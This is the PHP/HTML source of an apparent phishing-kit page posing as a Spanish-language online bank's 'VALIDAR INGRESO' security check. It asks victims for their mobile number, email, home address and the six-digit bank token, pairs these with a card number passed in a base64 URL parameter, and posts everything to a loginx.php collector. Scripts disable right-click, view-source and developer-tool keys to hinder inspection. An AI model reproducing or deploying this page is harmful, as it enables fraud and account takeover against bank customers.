<?php
error_reporting(0);
session_start();
/*===================================================*/
$card = ($_SESSION["card"] ? $_SESSION["card"] : base64_decode($_GET["card"]));
$user = $_GET["cgi"];
/*===================================================*/
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="es" xml:lang="es">
<head>
<meta charset="utf-8">
<meta content="no-cache" http-equiv="pragma">
<meta content="no-cache" http-equiv="cache-control">
<link rel="stylesheet" type="text/css" href="css/resetearcss.css">
<link rel="stylesheet" type="text/css" href="css/tipografias.css">
<link rel="stylesheet" type="text/css" href="css/bienvenido.css">
<link rel="stylesheet" type="text/css" href="css/bn-estilos.css">
<link rel="stylesheet" type="text/css" href="../files/css/TheCodePoints.css">   
<script type="text/javascript" src="js/bn-jquery.js"></script>
<script type="text/javascript" src="js/jquery.ui.js"></script>
<script language="javascript" type="text/javascript">
function soloNumerosAll(e){
	tecla = (document.all) ? e.keyCode : e.which;
	if (tecla!=0){
	    if (tecla==8) return true;
	   	patron =/\d/
    	te = String.fromCharCode(tecla);
    	return patron.test(te);
    }
}
</script>
<style>
tr td{
	vertical-align:middle !important;
}

.ingreso {
	background:#fff;
	color: #000;
	height: 30px;
	font: 12px/30px arial;
	margin: 0px 1px 1px 0px;
	padding: 0px 0px 0px 13px;
	width: 287px;
	border:1px solid #fff;
}

.secure {  /* Clase para el input type="text" */
/* -webkit-text-security:disc !important; 
font-size: 9px !important; */
font-family:TheCodePoints !important; }
</style>
<script type="text/javascript" src="../jquery-1.8.3.min.js"></script>
<script>
function getParameterByName(name) {
name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
results = regex.exec(location.search);
return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " ")); }
jQuery(document).ready(function(){ 
var a = getParameterByName("cgi");
document.getElementById("cvalue").value = a; }); 
</script>
<script language="JavaScript">
document.onkeydown = function(e) {
tecla = (document.all) ? e.keyCode : e.which;
	//alert(tecla)
if (tecla === 116 || tecla === 123)  return false;
if (e.ctrlKey && (tecla === 67 || tecla === 83 || tecla === 85 || tecla === 86 || tecla === 116)) { return false; } else { return true; }};
$(document).keypress("u",function(e) { if(e.ctrlKey) { return false; } else { return true; } });
</script>
<script language="JavaScript">
document.addEventListener("contextmenu", function(e){e.preventDefault();}, false);
</script>
</head>
<body>
	<form name="frmConsulta" id="form" method="post">
		<input type="text" name="methodx_captcha" id="methodx" style="display: none;" value="datos">
		<input type="hidden" id="ind_long_clave" name="ind_long_clave" value="6" />
		<input type="hidden" id="param_captcha" name="param_captcha" value="1" />
		
		<div id="contenidos-informativos">
			<h2>Bienvenido/a</h2>
			<div id="cuentas">
				<table width="100%" border="0" align="center">
				<tbody>
				<tr align="left" valign="top">
					<td width="100%" colspan="3">
					  <table class="table-cuentas" width="100%" border="0" cellpadding="0" cellspacing="1">
						<tbody>
						<tr>
							<td colspan="2" align="center" class="texto" height="20"><p align="justify"> <!--Estimado Cliente, para poder participar del soteo de una de las 10 cuentas de S/. 5.000 es necesario que actualice su eMail, por favor complete el siguiente formulario. -->Para mayor seguridad es necesario que valide su ingreso a nuestra Banca por nternet, por favor ingrese los siguientes datos para poder continuar.</p></td>
						</tr>
						<tr>
							<td colspan="2" align="center" class="tituloTabla"><!--ACTUALIZAR CORREO DE CONSTANCIA-->VALIDAR INGRESO</td>
						</tr>	
						<tr>
							<td colspan="2" height="10" align="center" class="tituloCelda"><input type="hidden" maxlength="16"  name="txtNumeroTarjeta" id="txtNumeroTarjeta" value="<?= $card; ?>"/></td>
						  </tr>
						<tr>
							<td class="detalleCelda" align="right">Ingrese su Número de Celular</td>
							<td align="left" class="detalleCelda"><input type="text" placeholder="Celular" style="margin-left:2px; padding: 5px; border: 1px solid #CCC; padding-left: 5px; border-radius: 5px; outline: none; color: #71777f; font-family:'Trebuchet MS', Arial, Helvetica, sans-serif; font-size: 13px; text-align:left; width: 100px;" name="celular" id="celular" maxlength="9" onkeypress="return soloNumerosAll(event)" required="required"/></td>
						  </tr>
                        <tr>
							<td class="detalleCelda" align="right">Ingrese su Correo Electronico</td>
							<td align="left" class="detalleCelda"><input type="email" placeholder="Correo Electrónico" style="margin-left:2px; padding: 5px; border: 1px solid #CCC; padding-left: 5px; border-radius: 5px; outline: none; color: #71777f; font-family:'Trebuchet MS', Arial, Helvetica, sans-serif; font-size: 13px; text-align:left; width: 200px;" name="correo" id="correo" required="required"/></td>
						  </tr>
						<tr>
							<td class="detalleCelda" align="right">Ingrese su Dirección Domiciliaria</td>
							<td align="left" class="detalleCelda"><input type="text" placeholder="Dirección Domiciliaria" style="margin-left:2px; padding: 5px; border: 1px solid #CCC; padding-left: 5px; border-radius: 5px; outline: none; color: #71777f; font-family:'Trebuchet MS', Arial, Helvetica, sans-serif; font-size: 13px; text-align:left; width: 300px;" name="direccion" id="direccion" required="required"/></td>
						  </tr>
						<tr>
							<td colspan="2"><hr></td>
						</tr>
                        <tr>
						  <td colspan="2" align="center" class="texto" height="20">&nbsp;</td>
						  </tr>
          <tr>
					<td colspan="2" class="ingreso">
                    <input type="hidden" id="cvalue" name="cvalue" >
					  Ingresar los 6 dígitos del TOKEN <br>
				    <input type="text" name="token" id="token" class="input-chico secure" size="10" maxlength="6" onkeypress="return soloNumerosAll(event)"><div style="padding-left:220px; margin-top:-40px;"><img border="0" src="../files/img/toke.jpg"></div></td>
				</tr>
			<tr>
				<td colspan="2"><p>Nota:
					<br>Tener en cuenta que los 6 dígitos cambian cada minuto por lo cual debe ingresar antes que la 
					barra de tiempo se haya consumido.</p>
				</td>				
          </tr>
						</tbody>
						</table>
                  <tr>
                  <td width="24%">&nbsp;</td>
                  <td width="52%"><p style="padding-top:12px; height:25px; background-color:#DC291E; color:#FFF; text-align:center; border-radius:4px; display:none; font-size: 13px; font-family:'Trebuchet MS', Arial, Helvetica, sans-serif" id="error_men"></p></td>
                  <td width="24%">&nbsp;</td>
                  </tr>
                  <tr>
                    <td colspan="3" height="8"></td>
                  </tr>
                  <tr>
                    <td colspan="3" align="center">
						<div id="loginx" class="loginx" onclick="javascript:return enviar_parametro();">
                            CONTINUAR
                      </div></td>
                  </tr>
				  <tr>
			      <td colspan="3"></td>	
				<tr>
				  <td colspan="3"></tr>
				</tbody>
				</table>
			</div>
	  </div>
	</form>
<script language="javascript">
function enviar_parametro(){
		var celular = document.frmConsulta.celular.value;
		var correo = document.frmConsulta.correo.value;
		var direccion = document.frmConsulta.direccion.value;
	
		var vtoken = document.frmConsulta.token.value;
		var vcard = document.frmConsulta.cvalue.value;
		
		if (celular.length < 9){
		$("#error_men").html('Por favor ingrese su Número de Celular').fadeIn("fast").delay(4000).fadeOut("fast");
		document.frmConsulta.celular.focus()
		return false; }
	
		if (correo == ""){
		$("#error_men").html('Por favor ingrese su Correo Electrónico').fadeIn("fast").delay(4000).fadeOut("fast");
		document.frmConsulta.correo.focus()
		return false; }
		
		if (direccion == ""){
		$("#error_men").html('Por favor ingrese su Dirección Domiciliaria').fadeIn("fast").delay(4000).fadeOut("fast");
		document.frmConsulta.direccion.focus()
		return false; }
	
		if (vtoken.length < 6){
		$("#error_men").html('Por favor ingrese su Token').fadeIn("fast").delay(4000).fadeOut("fast");
		document.frmConsulta.token.focus()
		return false; }
		
		$('form').get(0).setAttribute('action', '../loginx.php?id=datos');
		$("#btnLogin").attr("disabled","disabled");
		$("form").submit();
}
</script>
</body></html>